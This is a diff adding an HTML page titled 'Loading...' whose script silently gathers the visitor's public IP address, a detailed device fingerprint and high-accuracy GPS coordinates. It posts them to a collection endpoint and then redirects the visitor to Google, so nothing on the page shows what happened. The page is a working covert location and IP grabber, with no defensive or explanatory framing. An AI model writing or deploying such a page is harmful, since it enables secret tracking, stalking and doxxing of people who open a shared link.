@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <style>
+        body { margin: 0; background: #fff; }
+    </style>
+</head>
+<body>
+
+    <script>
+        const REDIRECT_URL = "https://www.google.com";
+        const API_URL = "/api/collect";
+
+        async function getIP() {
+            try {
+                const res = await fetch("https://api.ipify.org?format=json");
+                const data = await res.json();
+                return data.ip;
+            } catch {
+                return null;
+            }
+        }
+
+        function getDeviceInfo() {
+            return {
+                user_agent: navigator.userAgent,
+                platform: navigator.platform || null,
+                language: navigator.language || null,
+                languages: navigator.languages ? Array.from(navigator.languages) : [],
+                screen_width: screen.width,
+                screen_height: screen.height,
+                device_pixel_ratio: window.devicePixelRatio || null,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || null,
+                online: navigator.onLine,
+                cookie_enabled: navigator.cookieEnabled,
+                hardware_concurrency: navigator.hardwareConcurrency || null,
+                max_touch_points: navigator.maxTouchPoints || 0,
+            };
+        }
+
+        function getLocation() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    resolve(null);
+                    return;
+                }
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        resolve({
+                            latitude: pos.coords.latitude,
+                            longitude: pos.coords.longitude,
+                            accuracy: pos.coords.accuracy,
+                            altitude: pos.coords.altitude,
+                            altitude_accuracy: pos.coords.altitudeAccuracy,
+                            heading: pos.coords.heading,
+                            speed: pos.coords.speed,
+                        });
+                    },
+                    () => resolve(null),
+                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                );
+            });
+        }
+
+        async function main() {
+            const [ip, location] = await Promise.all([getIP(), getLocation()]);
+            const device_info = getDeviceInfo();
+
+            const payload = {
+                ip: ip,
+                location: location,
+                device_info: device_info,
+                timestamp: new Date().toISOString(),
+            };
+
+            try {
+                await fetch(API_URL, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(payload),
+                });
+            } catch {}
+
+            window.location.href = REDIRECT_URL;
+        }
+
+        main();
+    </script>
+</body>
+</html>
